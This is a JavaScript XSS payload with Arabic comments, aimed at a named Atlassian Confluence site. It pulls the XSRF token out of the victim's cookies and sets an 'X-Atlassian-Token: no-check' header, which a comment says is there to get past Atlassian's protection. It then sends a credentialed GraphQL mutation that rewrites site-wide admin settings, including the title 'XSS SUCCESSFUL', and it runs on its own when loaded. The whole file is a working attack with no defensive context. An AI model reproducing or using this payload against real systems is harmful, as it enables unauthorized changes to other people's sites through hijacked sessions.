function loadDoc1() {
  // 1. محاولة استخراج توكن الـ XSRF من الصفحة
  // غالبًا ما يكون موجودًا في وسم meta أو في الكوكيز المتاحة
  var xsrfToken = "";
  var nameEQ = "atlassian.xsrf.token=";
  var ca = document.cookie.split(';');
  for(var i=0;i < ca.length;i++) {
    var c = ca[i].trim();
    if (c.indexOf(nameEQ) == 0) xsrfToken = c.substring(nameEQ.length,c.length);
  }

  var xhttp = new XMLHttpRequest();
  var url = "https://anshall.atlassian.net/cgraphql?q=ConfigurationFormConfigurationPageUpdateMutation";

  xhttp.open("POST", url, true);

  // الرؤوس الأساسية
  xhttp.setRequestHeader("Content-type", "application/json");
  xhttp.setRequestHeader("Accept", "*/*");
  
  // الرؤوس الأمنية المطلوبة لتجاوز حماية Atlassian
  xhttp.setRequestHeader("X-Atlassian-Token", "no-check");
  if (xsrfToken) {
    xhttp.setRequestHeader("X-XSRF-Token", xsrfToken);
  }

  xhttp.withCredentials = true;

  var data = JSON.stringify([{
    "operationName": "ConfigurationFormConfigurationPageUpdateMutation",
    "variables": {
      "siteConfigInput": {
        "siteTitle": "XSS SUCCESSFUL", // جرب اسماً واضحاً جداً للتأكد
        "customContactMessage": "Modified via XSS",
        "isContactAdministratorsFormEnabled": true,
        "siteHomePage": "Confluence Home",
        "isEditorConversionForSiteEnabled": true,
        "isEditorFullWidthEnabled": false,
        "isEmailNotificationEnabled": true,
        "isPushNotificationEnabled": true,
        "isLikesEnabled": true,
        "timeFormat": "h:mm a",
        "dateTimeFormat": "MMM dd, yyyy HH:mm",
        "dateFormat": "MMM dd, yyyy",
        "longNumberFormat": "###############",
        "decimalNumberFormat": "###############.##########",
        "maxAttachmentSize": 104857600,
        "maxNumberOfAttachmentsPerUpload": 6,
        "isExternalConnectionsEnabled": true,
        "connectionTimeout": 10000,
        "socketTimeout": 10000,
        "globalDefaultLocale": "en_US",
        "indexingLanguage": "english"
      }
    },
    "query": "mutation ConfigurationFormConfigurationPageUpdateMutation($siteConfigInput: ConfluenceUpdateSiteConfigurationInput!) {\n  confluence {\n    updateSiteConfiguration(input: $siteConfigInput) {\n      errors {\n        message\n        extensions {\n          errorType\n          statusCode\n          __typename\n        }\n        __typename\n      }\n      success\n      __typename\n    }\n    __typename\n  }\n}\n"
  }]);

  xhttp.onreadystatechange = function() {
    if (this.readyState == 4) {
      console.log("Response Status: " + this.status);
      console.log("Full Response: " + this.responseText);
    }
  };

  xhttp.send(data);
}

loadDoc1();

